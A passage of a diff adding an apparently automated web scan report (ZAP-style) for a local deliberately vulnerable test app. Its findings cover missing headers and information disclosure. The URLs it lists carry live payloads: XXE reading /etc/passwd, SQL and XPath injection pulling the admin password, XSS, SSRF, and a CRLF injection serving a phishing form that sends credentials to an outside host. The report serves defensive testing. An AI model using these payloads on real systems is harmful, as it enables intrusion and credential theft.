+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">HTTP/1.0 500 Internal Server Error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">HTTP/1.0 500 Internal Server Error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path=foobar</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">HTTP/1.0 500 Internal Server Error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">7</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Review the source code of this page. Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on the server side and not exposing them to the user.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p></p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">200</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">13</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-low">
+                <a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Private IP Disclosure</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>A private IP (such as 10.x.x.x, 172.x.x.x, 192.168.x.x) or an Amazon EC2 private hostname (for example, ip-10-0-56-78) has been found in the HTTP response body. This information might be helpful for further attacks targeting internal systems.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?domain=www.google.com</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">192.168.1.1</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">1</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Remove the private IP address from the HTTP response body.  For comments, use JSP/ASP/PHP comment instead of HTML/JavaScript comment which can be seen by client browsers.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>192.168.1.1</p><p>192.168.1.1</p><p></p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>https://tools.ietf.org/html/rfc1918</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">200</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">13</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-low">
+                <a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">X-Content-Type-Options Header Missing</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path=dsvw.py</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?include</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir=http%3A%2F%2Fdsvw.c1.biz</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?foobar</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?charset=utf8</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path=http%3A%2F%2F127.0.0.1%3A631</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?comment</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?size=32</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">26</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At "High" threshold this scan rule will not alert on client or server error responses.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx</p><p>https://owasp.org/www-community/Security_Headers</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">16</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">15</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-info">
+                <th width="20%"><a name="info"></a>Informational (Medium)</th><th width="80%">Information Disclosure - Sensitive Information in URL</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password&amp;username</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">username</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">username</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password&amp;username</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">password</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">password</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">2</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Do not pass sensitive information in URIs.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>The URL contains potentially sensitive information. The following string was found via the pattern: user</p><p>username</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p></p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">200</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">13</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-info">
+                <th width="20%"><a name="info"></a>Informational (Low)</th><th width="80%">Information Disclosure - Suspicious Comments</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/sitemap.xml</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?include</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?foobar</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password&amp;username</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path=dsvw.py</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/robots.txt</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir=http%3A%2F%2Fdsvw.c1.biz</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?comment</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?charset=utf8</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">from</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">24</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
